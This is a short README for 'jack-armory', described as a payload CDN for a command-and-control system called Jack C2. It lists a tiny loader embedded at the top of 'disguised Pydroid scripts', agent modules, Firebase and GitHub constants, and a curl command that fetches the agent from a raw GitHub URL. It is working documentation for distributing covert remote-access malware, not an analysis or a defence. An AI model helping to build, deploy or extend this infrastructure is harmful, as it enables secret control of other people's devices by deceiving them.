# jack-armory

Payload CDN for Jack C2. Public raw files fetched by the loader and agent over HTTPS.

## Layout

- `manifest.json` — module index consumed by agent and operator app
- `loaders/tiny.py` — 3-line loader embedded at top of disguised Pydroid scripts
- `modules/` — agent core and drop-in modules

## Constants

- PROJECT_ID: `jack-c2-b55bb`
- GH_BASE: `https://raw.githubusercontent.com/JackPyDev/jack-armory/main`
- FCM topic: `device_online`

## Deploy

Push all files. Verify raw fetch:

    curl https://raw.githubusercontent.com/JackPyDev/jack-armory/main/modules/agent.py# jack-armory